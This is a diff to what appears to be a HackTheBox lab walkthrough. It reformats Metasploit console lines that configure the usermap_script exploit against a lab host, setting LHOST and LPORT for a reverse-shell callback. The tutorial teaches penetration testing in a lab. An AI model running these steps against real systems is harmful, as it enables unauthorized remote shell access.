@@ -285,19 +285,22 @@ msf exploit(usermap_script) > set rhost 10.10.10.3
 We also need to tell MSF some more stuff - what payload to use, what port to listen on and what IP-address it should connect back to. This is the same as the example used above. The MSF-module exploit will deliver the payload, but you need to supply it with the listener IP and PORT. To set this, do the following:
 
 ```text
-msf exploit(usermap_script) > set LHOST 10.10.14.18 lhost => 10.10.14.18
+msf exploit(usermap_script) > set LHOST 10.10.14.18 
+lhost => 10.10.14.18
 ```
 
 We can also use tun0 for our LHOST \(this is the VPN-adapter connected to HackTheBox in this case\):
 
 ```text
-msf exploit(usermap_script) > set LHOST tun0lhost => tun0
+msf exploit(usermap_script) > set LHOST tun0
+lhost => tun0
 ```
 
 Then we need to tell it what port to listen on. An important point here is that we should try to use a port that isn't already in use to avoid problems. 4444 is such a port:
 
 ```text
-msf exploit(usermap_script) > set LPORT 4444 lport => 4444
+msf exploit(usermap_script) > set LPORT 4444 
+lport => 4444
 ```
 
 Usually these exploit modules come with a premade payload, but we can also modify the payload. This, however, is something we will get more into when we get to part 2:
